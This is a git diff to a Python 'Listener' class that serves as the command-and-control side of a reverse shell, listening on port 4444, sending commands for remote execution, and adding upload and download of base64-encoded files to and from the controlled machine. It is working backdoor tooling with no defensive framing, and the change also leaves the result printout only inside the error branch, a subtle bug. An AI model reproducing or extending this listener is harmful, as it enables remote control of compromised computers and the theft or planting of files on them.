@@ -15,7 +15,7 @@ class Listener:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode())  # Encode before sending
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         json_data = ""
@@ -31,6 +31,10 @@ class Listener:
             file.write(base64.b64decode(content))
             return "[+] Download successful."
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def execute_remotely(self, command):
         self.reliable_send(command)
 
@@ -44,12 +48,20 @@ class Listener:
         while True:
             command = input(">> ")
             command = command.split(" ")
-            result = self.execute_remotely(command)
 
-            if command[0] == "download":
-                result = self.write_file(command[1], result)
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content.decode())
 
-            print(result)
+                result = self.execute_remotely(command)
+
+                if command[0] == "download" and "[-] Error" not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error executing command"
+
+                print(result)
 
 my_listener = Listener("xx.x.x.xx", 4444)
 my_listener.run()
